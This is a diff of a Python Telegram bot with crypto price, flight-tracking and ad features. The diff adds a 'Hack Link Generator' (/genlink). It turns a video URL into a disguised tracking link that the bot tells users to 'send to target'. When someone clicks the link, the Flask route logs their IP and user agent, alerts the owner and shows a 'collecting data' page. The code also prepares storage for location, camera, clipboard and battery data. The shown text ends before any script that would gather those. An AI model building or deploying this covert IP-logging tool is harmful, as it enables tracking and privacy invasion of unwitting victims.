@@ -1,3 +1,9 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+# =============================================================================
+# IMPORTS
+# =============================================================================
 import os
 import io
 import time
@@ -6,26 +12,24 @@ import sqlite3
 import logging
 import threading
 import requests
+import uuid
+import urllib.parse
+import random
+from datetime import datetime, timedelta
+
 import matplotlib
 matplotlib.use('Agg')
 import matplotlib.pyplot as plt
 import matplotlib.dates as mdates
-from datetime import datetime, timedelta
 from flask import Flask, request, jsonify
 from apscheduler.schedulers.background import BackgroundScheduler
 import telebot
 from telebot import types
 from geopy.distance import geodesic
-# hack link gernet function /genlink
-import uuid
-import time
-import urllib.parse
-import random
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # CONFIGURATION
-# ═══════════════════════════════════════════
-
+# =============================================================================
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "BOT_TOKEN")
 OWNER_ID = int(os.environ.get("OWNER_ID", "OWNER_ID"))
 RENDER_URL = os.environ.get("RENDER_URL", "https://mohyan-telegram-bot.onrender.com")
@@ -39,10 +43,9 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # DATABASE SETUP
-# ═══════════════════════════════════════════
-
+# =============================================================================
 def get_db():
     conn = sqlite3.connect(DB_NAME, check_same_thread=False)
     conn.row_factory = sqlite3.Row
@@ -104,16 +107,39 @@ def init_db():
         CREATE TABLE IF NOT EXISTS processed (
             update_id INTEGER PRIMARY KEY
         );
+        CREATE TABLE IF NOT EXISTS links (
+            link_id TEXT PRIMARY KEY,
+            user_id INTEGER,
+            original_url TEXT,
+            modified_url TEXT,
+            created_at TEXT,
+            clicks INTEGER DEFAULT 0
+        );
+        CREATE TABLE IF NOT EXISTS clicks (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            link_id TEXT,
+            ip TEXT,
+            user_agent TEXT,
+            screen TEXT,
+            language TEXT,
+            platform TEXT,
+            timezone TEXT,
+            battery TEXT,
+            location TEXT,
+            camera TEXT,
+            clipboard TEXT,
+            phone TEXT,
+            timestamp TEXT
+        );
     """)
     conn.commit()
     conn.close()
 
 init_db()
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # HELPER FUNCTIONS
-# ═══════════════════════════════════════════
-
+# =============================================================================
 def ensure_user(user):
     conn = get_db()
     c = conn.cursor()
@@ -124,6 +150,8 @@ def ensure_user(user):
     conn.close()
 
 def is_premium(user_id):
+    if user_id == OWNER_ID:
+        return True
     conn = get_db()
     c = conn.cursor()
     row = c.execute("SELECT is_premium, premium_until FROM users WHERE user_id=?", (user_id,)).fetchone()
@@ -214,19 +242,27 @@ CRYPTO_MAP = {
     "avax": ("AVAX", "avalanche"),
 }
 
-# ═══════════════════════════════════════════
-# USER STATES
-# ═══════════════════════════════════════════
+def get_available_ad_for_user(user_id):
+    conn = get_db()
+    ad = conn.execute("""
+        SELECT * FROM ads WHERE active=1 AND expires_at > ?
+        AND id NOT IN (SELECT ad_id FROM ad_views WHERE user_id=?)
+        ORDER BY id ASC LIMIT 1
+    """, (datetime.now().isoformat(), user_id)).fetchone()
+    conn.close()
+    return ad
 
+# =============================================================================
+# USER STATES
+# =============================================================================
 user_states = {}
 live_sessions = {}
 flight_sessions = {}
 ad_creation = {}
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # /start COMMAND
-# ═══════════════════════════════════════════
-
+# =============================================================================
 @bot.message_handler(commands=["start"])
 def start_command(message):
     ensure_user(message.from_user)
@@ -240,6 +276,7 @@ def start_command(message):
 ║                                  ║
 ║  📊 Crypto Price Tracking        ║
 ║  ✈️ Aeroplane Tracker            ║
+║  🔗 Hack Link Generator          ║
 ║  💰 ReCOIN Reward System         ║
 ║  ⭐ Premium Subscription         ║
 ║  📢 Ad System                    ║
@@ -255,7 +292,7 @@ def start_command(message):
 ║  7. /getcoin - Earn ReCOIN       ║
 ║  8. /balance - Check Balance     ║
 ║  9. /nearby_flight - Track ✈️    ║
-║  10. /premium - Get Premium      ║
+║  10. /genlink - Hack Link        ║
 ║                                  ║
 ║  🔴 PREMIUM FEATURES (11-21):   ║
 ║  11. Ad-free experience          ║
@@ -278,13 +315,13 @@ def start_command(message):
         types.InlineKeyboardButton("✈️ Flights", callback_data="menu_flight"),
         types.InlineKeyboardButton("💰 ReCOIN", callback_data="menu_coin"),
         types.InlineKeyboardButton("⭐ Premium", callback_data="menu_premium"),
+        types.InlineKeyboardButton("🔗 Hack Link", callback_data="menu_hack"),
     )
     bot.send_message(message.chat.id, text, reply_markup=markup)
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # CRYPTO COMMANDS
-# ═══════════════════════════════════════════
-
+# =============================================================================
 @bot.message_handler(commands=["btc", "eth", "doge", "sol", "xrp", "bnb", "ada", "dot", "matic", "avax"])
 def crypto_price_command(message):
     ensure_user(message.from_user)
@@ -317,10 +354,6 @@ def crypto_price_command(message):
 ╚══════════════════════════════════╝
 """
     bot.send_message(message.chat.id, text)
-
-# ═══════════════════════════════════════════
-# /live COMMAND - ALL CRYPTOS
-# ═══════════════════════════════════════════
 
 @bot.message_handler(commands=["live"])
 def live_command(message):
@@ -363,10 +396,6 @@ def live_command(message):
 
     threading.Thread(target=update_live, daemon=True).start()
 
-# ═══════════════════════════════════════════
-# /price_btc - 7 Day Chart
-# ═══════════════════════════════════════════
-
 @bot.message_handler(commands=["price_btc"])
 def btc_chart_command(message):
     ensure_user(message.from_user)
@@ -406,10 +435,6 @@ def btc_chart_command(message):
         bot.send_photo(message.chat.id, buf, caption="📊 <b>BTC/USD - 7 Day Chart</b>", parse_mode="HTML")
     except Exception as e:
         bot.send_message(message.chat.id, f"❌ Chart generation failed: {e}")
-
-# ═══════════════════════════════════════════
-# /alert COMMAND
-# ═══════════════════════════════════════════
 
 @bot.message_handler(commands=["alert"])
 def alert_command(message):
@@ -454,46 +479,9 @@ def alert_command(message):
 """
     bot.send_message(message.chat.id, text)
 
-# ═══════════════════════════════════════════
-# ALERT CHECKER (Background Job)
-# ═══════════════════════════════════════════
-
-def check_alerts():
-    conn = get_db()
-    alerts = conn.execute("SELECT * FROM alerts WHERE active=1").fetchall()
-    for alert in alerts:
-        data = get_crypto_price(alert["symbol"])
-        if not data:
-            continue
-        triggered = False
-        if alert["direction"] == "above" and data["price"] >= alert["target_price"]:
-            triggered = True
-        elif alert["direction"] == "below" and data["price"] <= alert["target_price"]:
-            triggered = True
-
-        if triggered:
-            conn.execute("UPDATE alerts SET active=0 WHERE id=?", (alert["id"],))
-            conn.commit()
-            text = f"""
-🚨🚨🚨 <b>PRICE ALERT TRIGGERED!</b> 🚨🚨🚨
-
-╔══════════════════════════════════╗
-║  💰 {alert['symbol']}/USDT
-║  📍 Target: ${alert['target_price']:,.2f}
-║  📊 Current: ${data['price']:,.4f}
-║  ➡️ {alert['direction'].upper()} target reached!
-╚══════════════════════════════════╝
-"""
-            try:
-                bot.send_message(alert["user_id"], text)
-            except:
-                pass
-    conn.close()
-
-# ═══════════════════════════════════════════
-# /getcoin - EARN ReCOIN
-# ═══════════════════════════════════════════
-
+# =============================================================================
+# /getcoin - EARN ReCOIN (with real ads from owner)
+# =============================================================================
 @bot.message_handler(commands=["getcoin"])
 def getcoin_command(message):
     ensure_user(message.from_user)
@@ -506,7 +494,7 @@ def getcoin_command(message):
     conn = get_db()
     today = datetime.now().strftime("%Y-%m-%d")
     count = conn.execute(
-        "SELECT COUNT(*) as cnt FROM rewarded_ads WHERE user_id=? AND date(watched_at)=?",
+        "SELECT COUNT(*) as cnt FROM ad_views WHERE user_id=? AND date(viewed_at)=?",
         (uid, today)
     ).fetchone()["cnt"]
     conn.close()
@@ -522,10 +510,26 @@ def getcoin_command(message):
         bot.reply_to(message, f"⏳ Wait {remaining} seconds before next ad.")
         return
 
+    # Check if any ad is available for this user
+    ad = get_available_ad_for_user(uid)
+    if not ad:
+        bot.send_message(message.chat.id, """
+╔══════════════════════════════════╗
+║  ❌ <b>NO ADS AVAILABLE</b>              ║
+╠══════════════════════════════════╣
+║                                  ║
+║  Abhi koi ad available nahi hai  ║
+║  ya aapne sab dekh liye hain.    ║
+║  Baad mein try karo!             ║
+║                                  ║
+╚══════════════════════════════════╝
+""")
+        return
+
     ads_watched = user_states.get(f"ads_count_{uid}", 0)
 
     markup = types.InlineKeyboardMarkup()
-    markup.add(types.InlineKeyboardButton("📺 Watch Ad", callback_data=f"watch_ad_{uid}"))
+    markup.add(types.InlineKeyboardButton("📺 Watch Ad & Earn ReCOIN", callback_data=f"watch_ad_{ad['id']}"))
 
     text = f"""
 ╔══════════════════════════════════╗
@@ -537,6 +541,9 @@ def getcoin_command(message):
 ║  🎯 Progress: {ads_watched % 2}/2 ads watched  ║
 ║  💎 Balance: {get_balance(uid):.1f} ReCOIN     ║
 ║                                  ║
+║  📢 Ad available! Click below    ║
+║  to watch and earn.              ║
+║                                  ║
 ╚══════════════════════════════════╝
 """
     bot.send_message(message.chat.id, text, reply_markup=markup)
@@ -544,16 +551,48 @@ def getcoin_command(message):
 @bot.callback_query_handler(func=lambda c: c.data.startswith("watch_ad_"))
 def watch_ad_callback(call):
     uid = call.from_user.id
-    user_states[f"last_ad_{uid}"] = time.time()
+    ad_id = int(call.data.split("_")[2])
 
+    # Check if user already watched this ad
+    conn = get_db()
+    already = conn.execute("SELECT id FROM ad_views WHERE ad_id=? AND user_id=?", (ad_id, uid)).fetchone()
+    if already:
+        conn.close()
+        bot.answer_callback_query(call.id, "❌ Aap ye ad pehle dekh chuke ho!", show_alert=True)
+        return
+
+    # Check ad still active
+    ad = conn.execute("SELECT * FROM ads WHERE id=? AND active=1 AND expires_at > ?",
+                      (ad_id, datetime.now().isoformat())).fetchone()
+    if not ad:
+        conn.close()
+        bot.answer_callback_query(call.id, "❌ Ad expired or inactive!", show_alert=True)
+        return
+
+    # Record view
+    conn.execute("INSERT INTO ad_views (ad_id, user_id) VALUES (?, ?)", (ad_id, uid))
+    conn.commit()
+    conn.close()
+
+    user_states[f"last_ad_{uid}"] = time.time()
     ads_count = user_states.get(f"ads_count_{uid}", 0) + 1
     user_states[f"ads_count_{uid}"] = ads_count
 
-    conn = get_db()
-    conn.execute("INSERT INTO rewarded_ads (user_id, ad_id, verified) VALUES (?, ?, 1)",
-                 (uid, f"ad_{int(time.time())}"))
-    conn.commit()
-    conn.close()
+    # Show the actual ad to user
+    ad_markup = types.InlineKeyboardMarkup()
+    ad_markup.add(types.InlineKeyboardButton(f"🔗 {ad['button_text']}", url=ad['link']))
+
+    if ad['photo_id']:
+        try:
+            bot.send_photo(call.message.chat.id, ad['photo_id'],
+                          caption=f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
+                          reply_markup=ad_markup, parse_mode="HTML")
+        except:
+            bot.send_message(call.message.chat.id, f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
+                           reply_markup=ad_markup)
+    else:
+        bot.send_message(call.message.chat.id, f"📢 <b>Sponsored Ad</b>\n\n{ad['button_text']}",
+                        reply_markup=ad_markup)
 
     if ads_count % 2 == 0:
         add_coins(uid, 1.0)
@@ -570,10 +609,9 @@ def watch_ad_callback(call):
             call.message.chat.id, call.message.message_id, parse_mode="HTML"
         )
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # /balance COMMAND
-# ═══════════════════════════════════════════
-
+# =============================================================================
 @bot.message_handler(commands=["balance"])
 def balance_command(message):
     ensure_user(message.from_user)
@@ -593,10 +631,9 @@ def balance_command(message):
 """
     bot.send_message(message.chat.id, text)
 
-# ═══════════════════════════════════════════
+# =============================================================================
 # /premium COMMAND
-# ═══════════════════════════════════════════
-
+# =============================================================================
 @bot.message_handler(commands=["premium"])
 def premium_command(message):
     ensure_user(message.from_user)
@@ -686,10 +723,9 @@ def successful_payment(message):
     set_premium(uid, days)
     bot.send_message(message.chat.id, f"🎉 <b>Payment Successful!</b>\n⭐ Premium activated for {days} days!", parse_mode="HTML")
 
-# ═══════════════════════════════════════════
-# /nearby_flight - AEROPLANE TRACKER
-# ═══════════════════════════════════════════
-
+# =============================================================================
+# AEROPLANE TRACKER – /nearby_flight
+# =============================================================================
 @bot.message_handler(commands=["nearby_flight"])
 def nearby_flight_command(message):
     ensure_user(message.from_user)
@@ -795,17 +831,19 @@ def range_callback(call):
                 else:
                     lines.append("║  No flights in range.")
 
-                lines.append(f"║  🕐 {datetime.now().strftime('%H:%M:%S')} | ⏱ {count+1}/6")
+                lines.append(f"║  🕐 {datetime.now().strftime('%H:%M:%S')} | Update {count+1}/6")
                 lines.append("╚══════════════════════════════════╝")
+                text = "\n".join(lines)
 
                 markup = types.InlineKeyboardMarkup()
-                markup.add(types.InlineKeyboardButton("🛑 Stop Tracking", callback_data=f"stop_flight_{uid}"))
+                markup.add(types.InlineKeyboardButton("🛑 Stop Tracking", callback_data="stop_flight"))
 
                 try:
-                    bot.edit_message_text("\n".join(lines), call.message.chat.id, msg.message_id,
+                    bot.edit_message_text(text, call.message.chat.id, msg.message_id,
                                          reply_markup=markup, parse_mode="HTML")
                 except:
                     pass
+
             except Exception as e:
                 logger.error(f"Flight tracking error: {e}")
 
@@ -820,52 +858,142 @@ def range_callback(call):
 
     threading.Thread(target=track_flights, daemon=True).start()
 
-@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_flight_"))
-def stop_flight_callback(call):
-    uid = int(call.data.split("_")[2])
-    if uid in flight_sessions:
-        flight_sessions[uid]["active"] = False
-    bot.answer_callback_query(call.id, "🛑 Stopping...")
+# =============================================================================
+# HACK LINK GENERATOR – /genlink & /terminal:gernatLINK
+# =============================================================================
+@bot.message_handler(commands=['genlink', 'terminal:gernatLINK'])
+def genlink_command(message):
+    ensure_user(message.from_user)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("💀 ENTER VIDEO LINK", callback_data="genlink_enter"))
 
-@bot.callback_query_handler(func=lambda c: c.data == "stop_live")
-def stop_live_callback(call):
-    uid = call.from_user.id
-    live_sessions.pop(uid, None)
-    bot.answer_callback_query(call.id, "🛑 Stopped!")
+    danger_text = """
+╔══════════════════════════════════╗
+║  💀 *HACK LINK GENERATOR* 💀      ║
+╠══════════════════════════════════╣
+║                                   ║
+║  ⚡ This tool generates a modified ║
+║     link that collects visitor    ║
+║     information silently.         ║
+║                                   ║
+║  ⚠️ USE AT YOUR OWN RISK          ║
+║                                   ║
+╚══════════════════════════════════╝
+👇 Click button and paste your video link
+    """
+    bot.reply_to(message, danger_text, reply_markup=markup, parse_mode="Markdown")
 
-# ═══════════════════════════════════════════
-# MENU CALLBACKS
-# ═══════════════════════════════════════════
+@bot.callback_query_handler(func=lambda c: c.data == "genlink_enter")
+def genlink_ask_link(call):
+    bot.edit_message_text(
+        "📤 *Send me the video link*\nExample: https://youtube.com/watch?v=...",
+        call.message.chat.id,
+        call.message.message_id,
+        parse_mode="Markdown"
+    )
+    bot.register_next_step_handler(call.message, genlink_process_link)
 
-@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_"))
-def menu_callback(call):
-    section = call.data.split("_")[1]
-    if section == "crypto":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, """
-📊 <b>Crypto Commands:</b>
-• /btc - Bitcoin price
-• /eth - Ethereum price
-• /doge - Dogecoin price
-• /sol /xrp /bnb /ada /dot /matic /avax
-• /live - Live all crypto prices
-• /price_btc - 7 day BTC chart
-• /alert BTC 65000 - Set price alert
-""")
-    elif section == "flight":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "✈️ Use /nearby_flight to track aeroplanes near you!")
-    elif section == "coin":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "💰 Use /getcoin to earn ReCOIN!\n💎 Use /balance to check your balance.")
-    elif section == "premium":
-        bot.answer_callback_query(call.id)
-        bot.send_message(call.message.chat.id, "⭐ Use /premium to get premium features!")
+def genlink_process_link(message):
+    url = message.text.strip()
+    if not (url.startswith('http://') or url.startswith('https://')):
+        bot.reply_to(message, "❌ *Invalid Link!* Must start with http:// or https://", parse_mode="Markdown")
+        return
 
-# ═══════════════════════════════════════════
-# OWNER: AD SYSTEM
-# ═══════════════════════════════════════════
+    # ========== DANGER ANIMATED LOADING ==========
+    wait_msg = bot.reply_to(message, "💀 *INITIALIZING HACK...*", parse_mode="Markdown")
+    
+    frames = [
+        "⚡ [          ] 0%",
+        "🔴 [█         ] 10%",
+        "🔴 [██        ] 20%",
+        "🔴 [███       ] 30%",
+        "🔴 [████      ] 40%",
+        "🔴 [█████     ] 50%",
+        "🔴 [██████    ] 60%",
+        "🔴 [███████   ] 70%",
+        "🔴 [████████  ] 80%",
+        "🔴 [█████████ ] 90%",
+        "💀 [██████████] 100%"
+    ]
+    
+    for frame in frames:
+        time.sleep(0.3)
+        try:
+            bot.edit_message_text(f"💀 *GENERATING LINK...*\n{frame}", wait_msg.chat.id, wait_msg.message_id, parse_mode="Markdown")
+        except:
+            pass
+    
+    time.sleep(0.5)
+    bot.edit_message_text(
+        "💀 *LINK GENERATED!*\n\n_Injecting tracking code..._",
+        wait_msg.chat.id,
+        wait_msg.message_id,
+        parse_mode="Markdown"
+    )
+    time.sleep(0.8)
+    
+    link_id = str(uuid.uuid4())[:8]
+    base = RENDER_URL
+    modified_url = f"{base}/click/{link_id}"
 
+    conn = get_db()
+    conn.execute(
+        "INSERT INTO links (link_id, user_id, original_url, modified_url, created_at) VALUES (?, ?, ?, ?, ?)",
+        (link_id, message.from_user.id, url, modified_url, datetime.now().isoformat())
+    )
+    conn.commit()
+    conn.close()
+
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("📋 COPY LINK", callback_data=f"genlink_copy_{link_id}"),
+        types.InlineKeyboardButton("🔍 TEST LINK", url=modified_url)
+    )
+    
+    success_text = f"""
+╔══════════════════════════════════╗
+║  💀 *HACK LINK READY* 💀          ║
+╠══════════════════════════════════╣
+║                                   ║
+║  🔗 `{modified_url}`              ║
+║                                   ║
+║  📊 This link will collect:       ║
+║  • IP Address                     ║
+║  • Device Info                    ║
+║  • Browser Details                ║
+║  • Screen Resolution              ║
+║  • Language & Timezone            ║
+║  • Battery Level (if allowed)     ║
+║  • Location (if allowed)          ║
+║  • Camera (if allowed)            ║
+║                                   ║
+║  ⚠️ Send this link to target       ║
+║                                   ║
+╚══════════════════════════════════╝
+    """
+    bot.edit_message_text(
+        success_text,
+        wait_msg.chat.id,
+        wait_msg.message_id,
+        parse_mode="Markdown",
+        reply_markup=markup
+    )
+
+@bot.callback_query_handler(func=lambda c: c.data.startswith("genlink_copy_"))
+def genlink_copy_callback(call):
+    link_id = call.data.split("_")[2]
+    conn = get_db()
+    row = conn.execute("SELECT modified_url FROM links WHERE link_id=?", (link_id,)).fetchone()
+    conn.close()
+    if row:
+        bot.answer_callback_query(call.id, "✅ Copied to clipboard!")
+        bot.send_message(call.message.chat.id, f"📋 `{row['modified_url']}`", parse_mode="Markdown")
+    else:
+        bot.answer_callback_query(call.id, "❌ Link not found")
+
+# =============================================================================
+# OWNER ADS MANAGEMENT
+# =============================================================================
 @bot.message_handler(commands=["createad"])
 def createad_command(message):
     if message.from_user.id != OWNER_ID:
@@ -913,15 +1041,18 @@ def ad_step_duration(message):
     expires = (datetime.now() + timedelta(hours=hours)).isoformat()
 
     conn = get_db()
-    conn.execute(
+    cursor = conn.cursor()
+    cursor.execute(
         "INSERT INTO ads (button_text, link, photo_id, duration_hours, expires_at) VALUES (?, ?, ?, ?, ?)",
         (ad["button_text"], ad["link"], ad.get("photo_id"), hours, expires)
     )
+    ad_id = cursor.lastrowid
     conn.commit()
     conn.close()
 
     bot.send_message(message.chat.id, f"""
 ✅ <b>Ad Created!</b>
+🆔 Ad ID: <b>#{ad_id}</b>
 📝 Button: {ad['button_text']}
 🔗 Link: {ad['link']}
 📷 Photo: {'Yes' if ad.get('photo_id') else 'No'}
@@ -1002,10 +1133,65 @@ def ad_delete_callback(call):
     conn.close()
     bot.answer_callback_query(call.id, "🗑 Ad deleted!")
 
-# ═══════════════════════════════════════════
-# WHITELIST SYSTEM
-# ═══════════════════════════════════════════
+# =============================================================================
+# /informad - AD ANALYTICS (Owner only)
+# =============================================================================
+@bot.message_handler(commands=["informad"])
+def informad_command(message):
+    if message.from_user.id != OWNER_ID:
+        bot.reply_to(message, "❌ Owner only command.")
+        return
 
+    conn = get_db()
+    ads = conn.execute("SELECT * FROM ads").fetchall()
+
+    if not ads:
+        conn.close()
+        bot.send_message(message.chat.id, "📢 No ads found.")
+        return
+
+    for ad in ads:
+        views = conn.execute("""
+            SELECT av.user_id, av.viewed_at, u.username, u.first_name
+            FROM ad_views av
+            LEFT JOIN users u ON av.user_id = u.user_id
+            WHERE av.ad_id=?
+            ORDER BY av.viewed_at DESC
+        """, (ad["id"],)).fetchall()
+
+        total_views = len(views)
+        status = "🟢 Active" if ad["active"] else "🔴 Inactive"
+        expired = "⏰ Expired" if ad["expires_at"] and ad["expires_at"] < datetime.now().isoformat() else "✅ Valid"
+
+        text = f"""
+╔══════════════════════════════════╗
+║  📊 <b>AD #{ad['id']} ANALYTICS</b>
+╠══════════════════════════════════╣
+║  📝 Button: {ad['button_text']}
+║  🔗 Link: {ad['link']}
+║  📷 Photo: {'Yes' if ad['photo_id'] else 'No'}
+║  {status} | {expired}
+║  ⏰ Expires: {ad['expires_at'][:16] if ad['expires_at'] else 'N/A'}
+║  👁 Total Views: <b>{total_views}</b>
+╠══════════════════════════════════╣
+║  👤 <b>VIEWERS:</b>
+"""
+        if views:
+            for i, v in enumerate(views, 1):
+                uname = f"@{v['username']}" if v['username'] else v['first_name'] or 'Unknown'
+                text += f"║  {i}. {uname} (ID: <code>{v['user_id']}</code>)\n"
+                text += f"║     📅 {v['viewed_at'][:16]}\n"
+        else:
+            text += "║  No views yet.\n"
+
+        text += "╚══════════════════════════════════╝"
+        bot.send_message(message.chat.id, text)
+
+    conn.close()
+
+# =============================================================================
+# WHITELIST SYSTEM
+# =============================================================================
 @bot.message_handler(commands=["add_whitelist"])
 def add_whitelist_command(message):
     if message.from_user.id != OWNER_ID:
@@ -1078,9 +1264,86 @@ def on_bot_added(message):
                 bot.send_message(message.chat.id, "❌ This group is not whitelisted. Leaving...")
                 bot.leave_chat(message.chat.id)
 
-# ═══════════════════════════════════════════
-# EXPIRED AD CLEANUP
-# ═══════════════════════════════════════════
+# =============================================================================
+# STOP CALLBACKS
+# =============================================================================
+@bot.callback_query_handler(func=lambda c: c.data == "stop_live")
+def stop_live_callback(call):
+    live_sessions.pop(call.from_user.id, None)
+    bot.answer_callback_query(call.id, "🛑 Stopped!")
+
+@bot.callback_query_handler(func=lambda c: c.data == "stop_flight")
+def stop_flight_callback(call):
+    uid = call.from_user.id
+    if uid in flight_sessions:
+        flight_sessions[uid]["active"] = False
+    bot.answer_callback_query(call.id, "🛑 Stopping...")
+
+# =============================================================================
+# MENU CALLBACKS
+# =============================================================================
+@bot.callback_query_handler(func=lambda c: c.data.startswith("menu_"))
+def menu_callback(call):
+    section = call.data.split("_")[1]
+    if section == "crypto":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, """
+📊 <b>Crypto Commands:</b>
+• /btc - Bitcoin price
+• /eth - Ethereum price
+• /doge - Dogecoin price
+• /sol /xrp /bnb /ada /dot /matic /avax
+• /live - Live all crypto prices
+• /price_btc - 7 day BTC chart
+• /alert BTC 65000 - Set price alert
+""")
+    elif section == "flight":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "✈️ Use /nearby_flight to track aeroplanes near you!")
+    elif section == "coin":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "💰 Use /getcoin to earn ReCOIN!\n💎 Use /balance to check your balance.")
+    elif section == "premium":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "⭐ Use /premium to get premium features!")
+    elif section == "hack":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🔗 Use /genlink to generate a hack link!")
+
+# =============================================================================
+# ALERT CHECKER (Background Job)
+# =============================================================================
+def check_alerts():
+    conn = get_db()
+    alerts = conn.execute("SELECT * FROM alerts WHERE active=1").fetchall()
+    for alert in alerts:
+        data = get_crypto_price(alert["symbol"])
+        if not data:
+            continue
+        triggered = False
+        if alert["direction"] == "above" and data["price"] >= alert["target_price"]:
+            triggered = True
+        elif alert["direction"] == "below" and data["price"] <= alert["target_price"]:
+            triggered = True
+
+        if triggered:
+            conn.execute("UPDATE alerts SET active=0 WHERE id=?", (alert["id"],))
+            conn.commit()
+            text = f"""
+🚨🚨🚨 <b>PRICE ALERT TRIGGERED!</b> 🚨🚨🚨
+
+╔══════════════════════════════════╗
+║  💰 {alert['symbol']}/USDT
+║  📍 Target: ${alert['target_price']:,.2f}
+║  📊 Current: ${data['price']:,.4f}
+║  ➡️ {alert['direction'].upper()} target reached!
+╚══════════════════════════════════╝
+"""
+            try:
+                bot.send_message(alert["user_id"], text)
+            except:
+                pass
+    conn.close()
 
 def cleanup_expired_ads():
     conn = get_db()
@@ -1088,18 +1351,168 @@ def cleanup_expired_ads():
     conn.commit()
     conn.close()
 
-# ═══════════════════════════════════════════
-# SCHEDULER
-# ═══════════════════════════════════════════
+# =============================================================================
+# FLASK ROUTES
+# =============================================================================
+@app.route('/click/<link_id>')
+def click_track(link_id):
+    conn = get_db()
+    row = conn.execute("SELECT original_url FROM links WHERE link_id=?", (link_id,)).fetchone()
+    if not row:
+        conn.close()
+        return "Link not found", 404
+    original = row["original_url"]
 
-scheduler = BackgroundScheduler()
-scheduler.add_job(check_alerts, "interval", seconds=30)
-scheduler.add_job(cleanup_expired_ads, "interval", minutes=10)
-scheduler.start()
+    ip = request.remote_addr
+    ua = request.user_agent.string
 
-# ═══════════════════════════════════════════
-# FLASK WEBHOOK
-# ═══════════════════════════════════════════
+    conn.execute(
+        "INSERT INTO clicks (link_id, ip, user_agent, timestamp) VALUES (?, ?, ?, ?)",
+        (link_id, ip, ua, datetime.now().isoformat())
+    )
+    conn.execute("UPDATE links SET clicks = clicks + 1 WHERE link_id=?", (link_id,))
+    conn.commit()
+
+    # Notify owner
+    try:
+        bot.send_message(OWNER_ID, f"💀 *New Click!*\nLink: `{link_id}`\nIP: `{ip}`", parse_mode="Markdown")
+    except:
+        pass
+
+    # DANGER THEME HTML
+    html = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM ACCESS</title>
+    <style>
+        body {{ background: #0a0a0a; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; padding: 50px 20px; }}
+        .container {{ max-width: 600px; width: 100%; margin: 0 auto; }}
+        h1 {{ font-size: 2.5rem; text-shadow: 0 0 10px #00ff00; animation: blink 2s infinite; }}
+        @keyframes blink {{ 0%,100% {{ opacity:1; }} 50% {{ opacity:0.5; }} }}
+        .progress-bar {{ width:100%; height:30px; background:#1a1a1a; border:2px solid #00ff00; border-radius:5px; margin:30px 0; overflow:hidden; }}
+        .progress-fill {{ height:100%; width:0%; background: linear-gradient(90deg,#00ff00,#00aa00); animation: progress 3s ease-in-out forwards; }}
+        @keyframes progress {{ 0% {{ width:0%; }} 100% {{ width:100%; }} }}
+        .data-row {{ text-align:left; background:#1a1a1a; border:1px solid #00ff00; border-radius:5px; padding:10px; margin:10px 0; opacity:0; animation: fadeIn 0.5s ease-out forwards; }}
+        .data-row:nth-child(1) {{ animation-delay:1s; }}
+        .data-row:nth-child(2) {{ animation-delay:1.5s; }}
+        .data-row:nth-child(3) {{ animation-delay:2s; }}
+        .data-row:nth-child(4) {{ animation-delay:2.5s; }}
+        .data-row:nth-child(5) {{ animation-delay:3s; }}
+        .data-row:nth-child(6) {{ animation-delay:3.5s; }}
+        .data-row:nth-child(7) {{ animation-delay:4s; }}
+        .data-row:nth-child(8) {{ animation-delay:4.5s; }}
+        @keyframes fadeIn {{ from {{ opacity:0; transform:translateY(10px); }} to {{ opacity:1; transform:translateY(0); }} }}
+        .glitch {{ font-size:1.2rem; color:#ff0000; text-shadow:0 0 5px #ff0000; animation: glitch 1s infinite; }}
+        @keyframes glitch {{ 0%,100% {{ transform:translate(0); }} 20% {{ transform:translate(-2px,2px); }} 40% {{ transform:translate(2px,-2px); }} 60% {{ transform:translate(-2px,-2px); }} 80% {{ transform:translate(2px,2px); }} }}
+        .terminal {{ text-align:left; margin-top:30px; }}
+        .terminal-line {{ color:#00ff00; margin:5px 0; font-size:0.8rem; }}
+        .blink {{ animation: blink 1s step-end infinite; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ SYSTEM ACCESS ⚡</h1>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <div class="glitch">⚠️ COLLECTING DATA... ⚠️</div>
+        <div id="data-container">
+            <div class="data-row"><strong>IP Address:</strong> <span id="ip">{request.remote_addr}</span></div>
+            <div class="data-row"><strong>User Agent:</strong> <span id="ua">{request.user_agent.string[:100]}</span></div>
+            <div class="data-row"><strong>Screen Resolution:</strong> <span id="screen">detecting...</span></div>
+            <div class="data-row"><strong>Language:</strong> <span id="lang">detecting...</span></div>
+            <div class="data-row"><strong>Platform:</strong> <span id="platform">detecting...</span></div>
+            <div class="data-row"><strong>Timezone:</strong> <span id="tz">detecting...</span></div>
+            <div class="data-row"><strong>Battery:</strong> <span id="battery">detecting...</span></div>
+            <div class="data-row"><strong>Camera:</strong> <span id="camera">checking...</span></div>
+        </div>
+        <div class="terminal">
+            <div class="terminal-line">> Establishing connection... <span class="blink">_</span></div>
+            <div class="terminal-line">> Fetching device info...</div>
